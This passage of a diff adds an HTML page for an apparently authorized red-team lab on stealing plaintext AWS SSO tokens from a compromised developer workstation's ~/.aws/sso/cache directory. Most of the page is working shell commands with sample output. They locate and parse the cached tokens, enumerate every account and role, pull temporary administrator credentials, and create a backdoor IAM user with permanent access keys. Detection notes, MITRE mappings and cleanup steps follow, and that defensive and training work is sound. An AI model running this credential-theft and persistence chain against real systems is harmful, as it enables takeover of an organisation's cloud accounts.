+    <strong>Objective:</strong> Steal SSO tokens from developer workstations by harvesting plaintext cached tokens from the <code>~/.aws/sso/cache/</code> directory.
+  </div>
+
+  <div class="lab-disclaimer">
+    <i class="fa-solid fa-triangle-exclamation"></i>
+    <strong>Authorized Testing Only.</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+  </div>
+
+  <div class="lab-prereqs">
+    <div class="prereq-title"><i class="fa-solid fa-list-check"></i> Prerequisites</div>
+    <ul>
+      <li>Local file system read access on a compromised developer workstation (via malware, vulnerable application, physical access, or post-exploitation shell)</li>
+      <li>Target user must have run <code>aws sso login</code> recently and not have logged out</li>
+      <li><code>jq</code> installed on attacker machine for parsing JSON cache files</li>
+      <li>Network access from attacker machine to AWS SSO endpoints (<code>*.awsapps.com</code>, <code>portal.sso.*.amazonaws.com</code>)</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Locate cached SSO tokens on the compromised workstation. The AWS CLI stores tokens in plaintext JSON files under <code>~/.aws/sso/cache/</code> — no encryption at rest.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ find ~/.aws/sso/cache/ -name "*.json" -exec ls -la {} \;</div>
+            <div class="terminal-output">-rw-r--r-- 1 devuser devuser 1847 Apr  1 09:15 /home/devuser/.aws/sso/cache/botocore-client-id-us-east-1.json
+-rw-r--r-- 1 devuser devuser 3291 Apr  1 09:15 /home/devuser/.aws/sso/cache/a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0.json
+-rw-r--r-- 1 devuser devuser 2156 Mar 31 16:42 /home/devuser/.aws/sso/cache/f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9.json</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Parse the cached token files to extract access tokens and their expiration times. Identify which tokens are still valid.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ for f in ~/.aws/sso/cache/*.json; do
+    echo "=== $(basename $f) ==="
+    cat "$f" | jq '{
+        startUrl: .startUrl,
+        region: .region,
+        accessToken: (.accessToken // "N/A" | .[:40] + "..."),
+        expiresAt: .expiresAt,
+        clientId: (.clientId // "N/A" | .[:20] + "..."),
+        stillValid: ((.expiresAt // "1970-01-01T00:00:00Z") > now | tostring)
+    }' 2>/dev/null
+done</div>
+            <div class="terminal-output">=== botocore-client-id-us-east-1.json ===
+{
+    "startUrl": null,
+    "region": "us-east-1",
+    "accessToken": "N/A",
+    "expiresAt": null,
+    "clientId": "bG9jYWxob3N0OjEyMz...",
+    "stillValid": "false"
+}
+=== a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0.json ===
+{
+    "startUrl": "https://myorg.awsapps.com/start",
+    "region": "us-east-1",
+    "accessToken": "aoal7i29HSKhWEyp4BZ92kDqXl5rT0pQ83nVm...",
+    "expiresAt": "2026-04-01T17:15:00Z",
+    "clientId": "N/A",
+    "stillValid": "true"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Use the stolen token to list all AWS accounts accessible through the victim's SSO session.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ STOLEN_TOKEN=$(cat ~/.aws/sso/cache/a1b2c3d4*.json | jq -r '.accessToken')
+$ aws sso list-accounts --access-token "$STOLEN_TOKEN"</div>
+            <div class="terminal-output">{
+    "accountList": [
+        {"accountId": "123456789012", "accountName": "production", "emailAddress": "prod@corp.com"},
+        {"accountId": "234567890123", "accountName": "staging", "emailAddress": "staging@corp.com"},
+        {"accountId": "345678901234", "accountName": "development", "emailAddress": "dev@corp.com"}
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Obtain temporary credentials for every account and role combination available to the stolen token.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ for acct in $(aws sso list-accounts --access-token "$STOLEN_TOKEN" \
+    --query 'accountList[*].accountId' --output text); do
+    for role in $(aws sso list-account-roles --access-token "$STOLEN_TOKEN" \
+        --account-id "$acct" --query 'roleList[*].roleName' --output text); do
+        echo "--- $acct / $role ---"
+        aws sso get-role-credentials --role-name "$role" \
+            --account-id "$acct" --access-token "$STOLEN_TOKEN" \
+            --query 'roleCredentials.{key:accessKeyId,expiry:expiration}' 2>/dev/null
+    done
+done</div>
+            <div class="terminal-output">--- 123456789012 / AdministratorAccess ---
+{
+    "key": "ASIAIOSFODNN7PROD001",
+    "expiry": 1711987200000
+}
+--- 123456789012 / ReadOnlyAccess ---
+{
+    "key": "ASIAIOSFODNN7PROD002",
+    "expiry": 1711987200000
+}
+--- 234567890123 / AdministratorAccess ---
+{
+    "key": "ASIAIOSFODNN7STAG001",
+    "expiry": 1711987200000
+}
+--- 345678901234 / PowerUserAccess ---
+{
+    "key": "ASIAIOSFODNN7DEV0001",
+    "expiry": 1711987200000
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Demonstrate the risk: establish persistence (Lab 3 technique) using the stolen token before it expires, converting the short-lived cache theft into long-lived IAM credentials.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Get admin creds in prod using stolen token
+$ CREDS=$(aws sso get-role-credentials \
+    --role-name AdministratorAccess \
+    --account-id 123456789012 \
+    --access-token "$STOLEN_TOKEN")
+$ export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.roleCredentials.accessKeyId')
+$ export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.roleCredentials.secretAccessKey')
+$ export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.roleCredentials.sessionToken')
+
+$ # Create backdoor user per Lab 3 technique before SSO token expires
+$ aws iam create-user --user-name svc-backup-monitor
+$ aws iam create-access-key --user-name svc-backup-monitor \
+    --query 'AccessKey.{id:AccessKeyId,secret:SecretAccessKey}'</div>
+            <div class="terminal-output">{
+    "id": "AKIAIOSFODNN7BACKDOR",
+    "secret": "wJalrXUtnFEMI/K7MDENG/BACKDOORACCESSKEY"
+}
+# Persistence established — stolen cache token converted to permanent IAM key</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="lab-detection">
+    <div class="detection-title"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li><strong>CloudTrail events:</strong> <code>sso:ListAccounts</code>, <code>sso:GetRoleCredentials</code> from a source IP different from the user's normal workstation</li>
+      <li>EDR/endpoint telemetry: file reads under <code>~/.aws/sso/cache/</code> by processes other than the AWS CLI (<code>aws</code>, <code>botocore</code>) are suspicious</li>
+      <li>Correlate CloudTrail <code>GetRoleCredentials</code> source IPs with the device IP seen in Identity Center login events — IP mismatch indicates token theft</li>
+      <li>Defense: use <code>aws sso logout</code> to revoke cached tokens when leaving the workstation; enforce disk encryption to protect the SSO cache at rest</li>
+    </ul>
+  </div>
+
+  <div class="lab-mitre">
+    <div class="mitre-title"><i class="fa-solid fa-shield-halved"></i> MITRE ATT&amp;CK Mappings</div>
+    <div class="mitre-tags">
+      <span class="mitre-tag">T1539 — Steal Web Session Cookie</span>
+      <span class="mitre-tag">T1552.001 — Unsecured Credentials: Credentials in Files</span>
+      <span class="mitre-tag">T1078.004 — Valid Accounts: Cloud Accounts</span>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Compromised Host</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">~/.aws/sso/cache/</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Extract Token</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Get Creds</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Full SSO Compromise</div>
+    </div>
+  </div>
+
+  <div class="lab-cleanup">
+    <div class="cleanup-title"><i class="fa-solid fa-broom"></i> Cleanup</div>
+    <p>If the backdoor IAM user from Step 5 was created, follow the cleanup steps from Lab 3. Unset all environment variables. The original stolen SSO token expires automatically; no action is needed to invalidate it unless you want to force expiry (use <code>aws sso logout</code> on the victim's machine or revoke via Identity Center console).</p>
+    <div class="terminal">
+      <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal — Cleanup</div>
+      <div class="terminal-body">
+        <div class="terminal-cmd">$ # Remove backdoor user if created in step 5
+$ aws iam detach-user-policy --user-name svc-backup-monitor \
+    --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess
+$ KEY_ID=$(aws iam list-access-keys --user-name svc-backup-monitor \
+    --query 'AccessKeyMetadata[0].AccessKeyId' --output text)
+$ aws iam delete-access-key --user-name svc-backup-monitor --access-key-id "$KEY_ID"
+$ aws iam delete-user --user-name svc-backup-monitor
+$ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> SSO tokens stored in plaintext at <code>~/.aws/sso/cache/</code> — any local file read vulnerability, malware, or compromised developer workstation yields full SSO compromise. There is no encryption at rest.
+  </div>
+</div>
